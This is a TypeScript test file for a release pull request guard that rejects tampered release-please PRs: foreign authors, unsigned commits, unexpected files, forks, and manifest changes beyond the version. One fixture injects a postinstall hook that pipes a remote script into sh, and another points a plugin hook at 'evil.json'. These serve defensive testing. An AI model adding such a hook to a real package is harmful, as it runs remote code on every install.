import { describe, expect, it } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
// @ts-expect-error The guard is a plain ES module script without types.
import { releasePrProblems } from "../scripts/release-pr-guard.mjs";

const BOT = "omms-release[bot]";
const SHA = "c".repeat(40);
const root = join(import.meta.dir, "..");
const basePackage = readFileSync(join(root, "package.json"), "utf8");
const basePlugin = readFileSync(join(root, ".claude-plugin/plugin.json"), "utf8");
const baseManifest = readFileSync(join(root, ".release-please-manifest.json"), "utf8");
const bump = (text: string) => text.replace(/"version": "[^"]+"/, '"version": "9.9.9"');

/** The shape of release pull request #90, the one change at a time. */
function releasePr() {
  return {
    pr: {
      user: { login: BOT, type: "Bot" },
      base: { ref: "main", repo: { full_name: "cmdaltctr/omms" } },
      head: { sha: SHA, repo: { full_name: "cmdaltctr/omms" } },
    },
    commits: [
      {
        sha: SHA,
        author: { login: BOT },
        committer: { login: "web-flow" },
        commit: { verification: { verified: true } },
      },
    ] as Record<string, unknown>[],
    files: [
      { filename: ".claude-plugin/plugin.json", status: "modified", deletions: 1 },
      { filename: ".release-please-manifest.json", status: "modified", deletions: 1 },
      { filename: "CHANGELOG.md", status: "modified", deletions: 0 },
      { filename: "package.json", status: "modified", deletions: 1 },
    ],
    contents: {
      base: {
        "package.json": basePackage,
        ".claude-plugin/plugin.json": basePlugin,
        ".release-please-manifest.json": baseManifest,
      } as Record<string, string>,
      head: {
        "package.json": bump(basePackage),
        ".claude-plugin/plugin.json": bump(basePlugin),
        ".release-please-manifest.json": JSON.stringify({ ".": "9.9.9" }),
      } as Record<string, string>,
    },
    bot: BOT,
    testedSha: SHA,
  };
}

describe("release pull request guard", () => {
  it("merges untouched release-please output", () => {
    expect(releasePrProblems(releasePr())).toEqual([]);
  });

  it("refuses a pull request opened by a person on a release-please branch", () => {
    const input = releasePr();
    input.pr.user = { login: "contributor", type: "User" };
    expect(releasePrProblems(input)).toContain(`author is contributor, not ${BOT}`);
  });

  it("refuses a person's commit added to the release pull request", () => {
    const input = releasePr();
    input.commits.push({
      sha: "d".repeat(40),
      author: { login: "contributor" },
      committer: { login: "contributor" },
      commit: { verification: { verified: false } },
    });
    const problems = releasePrProblems(input);
    expect(problems).toContain(`commit ddddddd author is not ${BOT}`);
    expect(problems).toContain("commit ddddddd is not signed by GitHub");
  });

  it("refuses a pushed commit that copies the release App's author", () => {
    const input = releasePr();
    input.commits[0] = {
      ...input.commits[0],
      committer: { login: "contributor" },
      commit: { verification: { verified: false } },
    };
    expect(releasePrProblems(input)).toContain("commit ccccccc is not signed by GitHub");
  });

  it("refuses source, workflow, and new files", () => {
    const input = releasePr();
    input.files.push(
      { filename: "src/index.ts", status: "modified", deletions: 0 },
      { filename: ".github/workflows/release.yml", status: "modified", deletions: 0 },
      { filename: "CHANGELOG.md.bak", status: "added", deletions: 0 }
    );
    const problems = releasePrProblems(input);
    expect(problems).toContain("unexpected file src/index.ts");
    expect(problems).toContain("unexpected file .github/workflows/release.yml");
    expect(problems).toContain("unexpected file CHANGELOG.md.bak");
  });

  it("refuses a package.json change beyond the version", () => {
    const input = releasePr();
    const head = JSON.parse(input.contents.head["package.json"]!);
    head.scripts.postinstall = "curl https://example.invalid | sh";
    input.contents.head["package.json"] = JSON.stringify(head);
    expect(releasePrProblems(input)).toContain("package.json changes more than the version");
  });

  it("refuses a plugin manifest change beyond the version", () => {
    const input = releasePr();
    const head = JSON.parse(input.contents.head[".claude-plugin/plugin.json"]!);
    head.hooks = "./evil.json";
    input.contents.head[".claude-plugin/plugin.json"] = JSON.stringify(head);
    expect(releasePrProblems(input)).toContain(
      ".claude-plugin/plugin.json changes more than the version"
    );
  });

  it("refuses version files that disagree or are not plain versions", () => {
    const input = releasePr();
    input.contents.head[".release-please-manifest.json"] = JSON.stringify({ ".": "9.9.8" });
    expect(releasePrProblems(input)).toContain("version files disagree");
    input.contents.head["package.json"] = basePackage.replace(
      /"version": "[^"]+"/,
      '"version": "9.9.9-evil"'
    );
    expect(releasePrProblems(input)).toContain("package.json has version 9.9.9-evil");
  });

  it("refuses a fork, another base, a moved head, and a changelog that removes lines", () => {
    const input = releasePr();
    input.pr.head = { sha: "e".repeat(40), repo: { full_name: "someone/omms" } };
    input.pr.base = { ...input.pr.base, ref: "next" };
    input.files[2] = { filename: "CHANGELOG.md", status: "modified", deletions: 3 };
    const problems = releasePrProblems(input);
    expect(problems).toContain("head is a fork");
    expect(problems).toContain("base is next, not main");
    expect(problems).toContain("head moved after the tested commit");
    expect(problems).toContain("CHANGELOG.md removes lines");
  });

  it("refuses a version file it cannot read", () => {
    const input = releasePr();
    delete input.contents.head["package.json"];
    expect(releasePrProblems(input)).toContain("package.json cannot be read");
  });
});
